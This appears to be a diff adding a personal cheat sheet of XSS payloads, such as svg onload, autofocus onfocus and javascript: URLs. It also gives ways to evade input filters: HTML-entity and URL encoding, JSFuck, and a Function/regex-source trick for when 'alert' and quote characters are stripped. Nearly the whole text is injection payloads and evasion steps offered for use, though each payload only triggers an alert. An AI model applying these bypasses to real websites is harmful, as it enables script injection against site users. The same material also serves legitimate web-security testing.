@@ -1,0 +1,33 @@
+eval()	--- will execute any javascript code if we inserted inside it
+
+autofocus onfocus=alert(1337)     --- try this if there is no user interaction,
+
+javascript:alert(1)
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+if [\(\`\)\\]  are blocked then do encoding like follow
+
+<!-- URL Encoding + HTML Entity Encoding -->	--2nd step
+%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E
+
+<!-- HTML Entity Encoding --> 	--1st step
+<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">
+
+<!-- No Encoding -->          --payload
+<svg onload="alert(1337)">
+
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+if  [A-Za-z0-9]  are blocked means everything is blocked so go on JSFuck then copy payload
+n use that. if that give error then do url encode and then use payload
+
+--------------------------------------------------------------------------------------------------------------
+
+`'"+-!\[] are replaced by an underscore
+alert is replaced with underscore
+then use Function(/ALERT(1337)/.source.toLowerCase())()
+
+eval(Function(/ALERT(1337)/.source.toLowerCase())())
+
+------------------------------------------------------------------------------------------------------------
